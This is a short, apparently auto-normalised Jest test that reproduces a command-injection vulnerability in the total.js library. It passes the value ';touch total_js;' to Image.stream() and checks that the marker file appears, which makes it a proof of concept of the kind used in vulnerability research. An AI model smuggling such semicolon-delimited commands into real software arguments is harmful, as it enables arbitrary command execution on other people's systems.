const v37 = done => {
    const v20 = expect.assertions(2);
    v20;
    const total = require('total.js');
    const fs = require('fs');
    const path = './total_js';
    try {
        const v21 = fs.existsSync(path);
        if (v21) {
            const v22 = fs.unlinkSync(path);
            v22;
            const v23 = console.log('File removed:', path);
            v23;
        }
    } catch (err) {
        const v24 = console.error(err);
        v24;
    }
    file_exist = fs.existsSync(path);
    const v25 = expect(file_exist);
    const v26 = v25.toBe(false);
    v26;
    let image = Image.load('');
    let payload = ';touch total_js;';
    var timetaken = 'Time taken by addCount function';
    const v27 = console.time(timetaken);
    v27;
    const v28 = image.stream(payload);
    v28;
    const v29 = console.timeEnd(timetaken);
    v29;
    const v35 = () => {
        file_exist = fs.existsSync(path);
        const v30 = expect(file_exist);
        const v31 = v30.toBe(true);
        v31;
        const v33 = () => {
            const v32 = done();
            v32;
        };
        const v34 = fs.unlink(path, v33);
        v34;
    };
    const v36 = setTimeout(v35, 1000);
    v36;
};
const v38 = test('Command Injection in total.js', v37);
v38;